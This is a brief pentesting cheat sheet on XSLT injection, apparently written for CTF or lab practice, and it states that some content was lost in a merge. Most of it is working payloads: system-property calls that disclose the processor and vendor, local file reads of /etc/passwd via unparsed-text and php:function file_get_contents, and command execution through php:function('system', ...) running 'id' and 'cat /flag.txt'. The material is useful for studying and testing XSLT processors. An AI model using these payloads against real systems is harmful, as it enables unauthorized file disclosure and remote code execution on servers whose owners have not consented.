# 🤠 XSLT

Merge erased everything, go back and look at the cheat sheet

### Information Disclosure

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

<figure><img src="../../../.gitbook/assets/image (1350).png" alt=""><figcaption></figcaption></figure>

### Local File Inclusion (LFI)

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

it was only introduced in XSLT version 2.0, However, if the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents`

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

### Remote Code Execution (RCE)

```
<xsl:value-of select="php:function('system','id')" />
```



```
<xsl:value-of select="php:function('system','cat /flag.txt')" />
```

<figure><img src="../../../.gitbook/assets/image (1349).png" alt=""><figcaption></figcaption></figure>
